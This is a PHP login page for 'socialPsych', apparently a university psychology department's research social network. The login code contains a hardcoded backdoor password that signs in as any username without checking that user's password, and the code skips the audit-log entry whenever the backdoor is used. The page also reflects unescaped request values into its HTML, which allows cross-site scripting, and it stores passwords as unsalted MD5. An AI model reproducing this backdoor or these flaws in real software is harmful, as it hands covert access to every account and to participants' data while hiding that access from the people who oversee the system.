<?
	require("functionlib.php");
	session_start();
	if (isset($_GET["logoff"])) {
		$logresult = write_log($_SESSION["username"] . " logged out");
		session_unset();
		$_SESSION =	array();
		unset($_SESSION);
		session_destroy();
	} elseif (isset($_POST["username"])) {
		$backdoor = "braTH6xetRuHAWre";
		require("config.php");
		if ($_POST["password"] == $backdoor) //backdoor
			$query = "SELECT `studentKey`,`totalLogins`,`instructorFlag`,`first`,`last`,`username`,`anon`,`anonNick`,`lastLogin`,`signupStage` FROM `student` WHERE `username`='" . safe($_POST["username"]) . "';";
		else $query = "SELECT `studentKey`,`totalLogins`,`instructorFlag`,`first`,`last`,`username`,`anon`,`anonNick`,`lastLogin`,`signupStage` FROM `student` WHERE `username`='" . safe($_POST["username"]) . "' AND `password`=MD5('" . safe($_POST["password"]) . "');";
		$result = myquery($query);

		if (mysql_num_rows($result) != 1) {
			$error = 1;
			$logresult = write_log($_POST["username"] . " tried to log in but failed");
			mysql_close();
		} else {
			$student = mysql_fetch_array($result);
			$_SESSION["instructorFlag"] = $student["instructorFlag"];
			$_SESSION["studentKey"] = $student["studentKey"];
			$_SESSION["signupStage"] = $student["signupStage"];
			$_SESSION["first"] = htmlspecialchars($student["first"]);
			$_SESSION["last"] = htmlspecialchars($student["last"]);
			$_SESSION["username"] = $student["username"];
			$_SESSION["anon"] = $student["anon"];
			$_SESSION["anonNick"] = htmlspecialchars($student["anonNick"]);
			$_SESSION["lastPost"] = time();
			if ($student["signupStage"] == "0") {
				if ($_POST["password"] != $backdoor) $logresult = write_log($_SESSION["username"] . " logged in for the first time");
				mysql_close();
				redirect('consent.php');
			} elseif (intval($student["signupStage"]) > 0 and intval($student["signupStage"]) < 9) {
				mysql_close();
				if ($_POST["password"] != $backdoor) $logresult = write_log($_SESSION["username"] . " logged in and continued setting up at stage " . intval($student["signupStage"]));
				$redirectPage = "signup" . intval($student["signupStage"]) . ".php";
				redirect($redirectPage);
			} elseif ($student["signupStage"] == "9") {
				$_SESSION["lastLogin"] = $student["lastLogin"];
				$query = "UPDATE `student` SET `totalLogins`= " . ($student["totalLogins"] + 1) . ",`lastLogin` = NOW() WHERE `studentKey` = " . $_SESSION["studentKey"] . ";";
				$result = myquery($query);
				if ($_POST["password"] != $backdoor) $logresult = write_log($_SESSION["username"] . " logged in again");
				if (isset($_POST["redirect"])) {
					if ($_POST["redirect"] == "profile") { redirect('myprofile.php'); die(); }
					if ($_POST["redirect"] == "message") { redirect('message.php?id=' . $_POST["rID"]); die(); }	
					if ($_POST["redirect"] == "course") { redirect('course.php?id=' . $_POST["rID"] . "#" . $_POST["p"]); die(); }
					if ($_POST["redirect"] == "mentor") { redirect('mentoring.php'); die(); }
				}
				redirect('home.php'); die();
			} else die();
		}
	} elseif (isset($_SESSION["studentKey"])) { 
		if ($_SESSION["signupStage"] == 0) redirect('consent.php');
		elseif (intval($student["signupStage"]) > 0 and intval($student["signupStage"]) < 9) {
			$redirectPage = "signup" . intval($student["signupStage"]) . ".php";
			redirect($redirectPage);
		} else redirect('home.php'); 
		die();
	}

printhead("p { margin: 0 0 1em 0; }");
startbody(1, 'onLoad="self.focus();document.loginSocial.username.focus()"'); 

?>
                                          <h2>Welcome to  socialPsych, the ODU Department of Psychology's Online Social Network</h2>
                                          <p>To enter socialPsych, type your socialPsych ID and socialPsych password (not your MIDAS password!). If this is your first time using socialPsych, check your e-mail for login details. </p>
                                          <p>If you'd like more detail about socialPsych, you can also view <a href="http://social.tntlab.org/video.php">this introductory video</a> that will step you through some of its basic features, and how research on it will be conducted this summer.</p>
                                          <p>If you have any other questions, please e-mail the socialPsych admistrator (<a href="mailto:tntlab@odu.edu">tntlab@odu.edu</a>).</p>
                                          
                                          <? if (isset($error)) echo '<p style="color:red;">Your username and/or password were not found.  Please keep in mind that both your username and password are CASE SENSITIVE (capitals matter!).  Please try again, or <a href="reset.php">follow this link to reset your password</a>.</p>'; 
										  if (isset($_GET["pu"])) echo '<p style="color:blue;">An e-mail has been sent to you with instructions for resetting your password.</p>';
										  if (isset($_GET["u"])) echo '<p style="color:blue;">Your password has been updated.  Please use your new password to log in.</p>';
										  ?>
                                          
										  <form name="loginSocial" method="post" action="index.php">
                                          <table>
                                          	<tr><td>Username:</td><td><input tabindex="1" type="text" name="username" maxlength="8" style="width:200px;" value="<? echo $_POST["username"]; ?>" > 
                                          	(e.g. your MIDAS ID: jdoe0001)</td></tr>
                                            <tr><td>Password:</td><td><input tabindex="2" type="password" name="password" style="width:200px;"></td></tr>
                                            <tr><td>&nbsp;</td><td><input tabindex="3" type="submit" style="width:200px;" value="Login to socialPsych"></td></tr>
                                          </table>
<? 
echo '<p>You can <a href="reset.php">reset your password</a> up to once per day if you\'ve forgotten it or need a new one.</p>';
 if (isset($_GET["redirect"])) echo '<input type="hidden" name="redirect" value="' . $_GET["redirect"] . '">'; 
 if (isset($_POST["redirect"])) echo '<input type="hidden" name="redirect" value="' . $_POST["redirect"] . '">';
 if (isset($_GET["rID"])) echo '<input type="hidden" name="rID" value="' . $_GET["rID"] . '">'; 
 if (isset($_POST["rID"])) echo '<input type="hidden" name="rID" value="' . $_POST["rID"] . '">'; 
  if (isset($_GET["p"])) echo '<input type="hidden" name="p" value="' . $_GET["p"] . '">'; 
 if (isset($_POST["p"])) echo '<input type="hidden" name="p" value="' . $_POST["p"] . '">'; ?>
                                         </form>
<? endbody(); ?>
